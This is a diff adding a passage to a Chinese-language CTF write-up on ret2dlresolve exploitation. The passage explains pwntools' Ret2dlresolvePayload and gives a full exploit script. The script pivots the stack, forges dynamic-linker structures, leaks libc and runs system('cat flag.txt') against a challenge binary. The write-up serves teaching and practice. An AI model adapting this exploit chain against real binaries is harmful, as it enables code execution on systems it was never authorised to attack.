@@ -116,7 +116,119 @@ typedef struct
   void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
 ...
 ```
+而这里我们可以自己构造这几个表的**表项**,而且这里需要我们填写其中的偏移部分即可
 
+这里介绍一个`pwntools`工具,介绍一下使用方法
+
+```python
+# 解析elf文件, 然后传入的symbol代表我想要本次解析的内容, args表示希望传递的参数
+dlresolve = Ret2dlresolvePayload(exe, symbol="write", args=["cat flag.txt"])
+...
+# 这里表示其寻找到的适合填入ret2dlresolve所构造的一系列元素地址,同时也是即将写入查询符号的地址
+dlresolve.data_addr
+# 表示在调用_dl_fixup中传递的第二个参数,同时也是JMPREL TABLE的表项index
+dlresolve.reloc_index
+# 这里就是所伪造的一系列内容
+dlresolve.payload
+# 这里是传递的第一个参数
+dlresolve.real_args[0]
+```
+
+然后本题有一个考点那就是本题你无法控制rdi,这就导致在即使你写入了write的libc地址仍然只能达成`write(0, buf, size)`
+但在打远程的时候,stdin并不是我们理解的终端屏幕,而是socat, 所以这样的write仍是可以进行回显
+但在打本地希望通过时需要`io=process("./pwn", stdin = PTY)`才可通过
+
+所以本题的解法就是使用ret2dl_resolve写入write的地址然后写泄漏libc
+
+exp如下: 
+```python
+
+#!/usr/bin/env python3
+
+from pwn import *
+context(arch = 'amd64', os = 'linux', log_level = 'debug')
+context.terminal = "kitty @launch --location=split --cwd=current".split()
+
+
+def start(argv=[], *a, **kw):
+    if args.LOCAL:
+        argv = argv if argv else [exe.path]
+        if args.GDB:
+            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
+        return process(argv, stdin=PTY, *a, **kw)
+    return remote(args.HOST or host, args.PORT or port, *a, **kw)
+
+
+def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
+    p = flat(args, **kwargs)
+    if any(c in unsafe_chars for c in p):
+        raise ValueError("unsafe:", p)
+    return p
+
+
+gdbscript = """
+b main
+c
+"""
+host, port = args.HOST or "localhost", args.PORT or 55550
+exe = context.binary = ELF(args.EXE or "./chall", False)
+libc = ELF("./libc.so.6", False)
+
+#io = start()
+io = process("./chall")
+write_rbp = exe.sym["main"] + 23
+write_rbp_with_rdx = exe.sym["main"] + 16
+pop_rbp = 0x40110D
+leave_ret = 0x401153
+
+dlresolve = Ret2dlresolvePayload(exe, symbol="write", args=["cat flag.txt"])
+#print(hex(dlresolve))
+log.info(f"{hex(dlresolve.data_addr) = }")
+# 获取plt首地址
+plt_init = exe.get_section_by_name(".plt").header.sh_addr
+print(hex(plt_init))
+
+
+io.send(safe_flat(0, exe.bss(0xF50 + 8), write_rbp))
+pause()
+io.send(safe_flat(0x1000, exe.bss(0xF50 + 8), write_rbp_with_rdx))
+pause()
+
+# Why not do it all at once? Because Indonesia's internet is so slow,
+# I can't even send 2000 bytes at once.
+rop1 = safe_flat(0, 0, pop_rbp, exe.sym["got.read"] + 8, write_rbp)
+
+rop2 = safe_flat(
+    # This will call dlresolve again for the read function.
+    # Try to place it as close as possible to dlresolve.data_addr.
+    # This is because _rtld_global_ro._dl_x86_cpu_features.xsave_state_size
+    # can have different values on different CPUs.
+    # See the _dl_runtime_resolve_xsavec function for more details.
+    exe.sym["read"],
+    plt_init,
+    dlresolve.reloc_index,
+    pop_rbp,
+    exe.bss(0x900),
+    write_rbp,
+)
+io.send(safe_flat(0, 0, pop_rbp, dlresolve.data_addr - len(rop1) - len(rop2) + 8, write_rbp))
+pause()
+io.send(rop1 + rop2 + dlresolve.payload)
+pause()
+io.send(safe_flat(exe.sym["read"] + 6, dlresolve.data_addr - len(rop2) - 8, leave_ret))
+pause()
+io.send(p8(libc.sym["read"] & 0xFF))
+libc.address = u64(io.recv(8)) - libc.sym["read"]
+log.info(f"{hex(libc.address) = }")
+
+rop = ROP(libc)
+rop.system(dlresolve.real_args[0])
+rop.exit(0)
+
+io.sendline(safe_flat(0, 0, rop.chain()))
+
+io.interactive()
+```
 
 
 # 参考
